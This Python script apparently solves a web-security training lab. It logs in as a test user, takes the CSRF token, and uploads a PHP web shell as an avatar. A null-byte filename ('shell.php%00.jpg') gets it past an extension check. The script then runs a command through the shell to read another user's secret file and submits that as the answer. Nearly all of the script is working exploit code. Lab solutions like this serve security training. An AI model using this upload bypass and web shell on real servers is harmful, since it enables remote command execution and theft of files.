import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("wiener", "peter")

page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# server whitelists image extensions, but doesn't handle null bytes
# the validator sees .jpg and allows it
# the filesystem hits the null byte and truncates to shell.php
shell = b'<?php system($_GET["cmd"]); ?>'
lab.info("Uploading shell with null byte in filename...")
resp = lab.post("/my-account/avatar", files={
    "avatar": ("shell.php%00.jpg", shell, "application/x-php")
}, data={
    "user": "wiener",
    "csrf": csrf
})
lab.info(f"Upload status: {resp.status_code}")

# file gets saved as shell.php after null byte truncation
secret_resp = lab.get("/files/avatars/shell.php?cmd=cat+/home/carlos/secret")
secret = secret_resp.text.strip()
lab.success(f"Secret: {secret}")

lab.post("/submitSolution", data={"answer": secret})
lab.check_solved()
